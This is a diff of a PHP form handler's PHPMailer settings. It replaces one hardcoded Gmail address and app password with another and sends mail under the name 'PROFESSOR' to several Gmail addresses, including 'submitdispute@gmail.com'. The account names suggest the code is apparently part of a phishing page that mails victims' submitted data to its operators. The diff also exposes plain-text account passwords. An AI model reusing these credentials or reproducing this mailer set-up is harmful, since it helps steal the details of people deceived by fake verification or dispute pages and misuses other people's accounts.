@@ -28,14 +28,14 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $mail->isSMTP();
         $mail->Host       = 'smtp.gmail.com'; // Replace with your SMTP server address
         $mail->SMTPAuth   = true;
-        $mail->Username   = 'opportunity.for.creators.verified@gmail.com'; // Replace with your email address
-        $mail->Password   = 'sezf uouz zabq riae'; // Replace with your email password
+        $mail->Username   = 'bayanicoye@gmail.com'; // Replace with your email address
+        $mail->Password   = 'rkhp ebkn sjcw ohgk'; // Replace with your email password
         $mail->SMTPSecure = 'tls';
         $mail->Port       = 587;
 
 
         // Email properties
-        $mail->setFrom('opportunity.for.creators.verified@gmail.com', 'PROFESSOR');
+        $mail->setFrom('bayanicoye@gmail.com', 'PROFESSOR');
         $mail->addAddress('submitdispute@gmail.com');
          $mail->addAddress('newzatpage@gmail.com');
          $mail->addAddress('abmr36033@gmail.com');
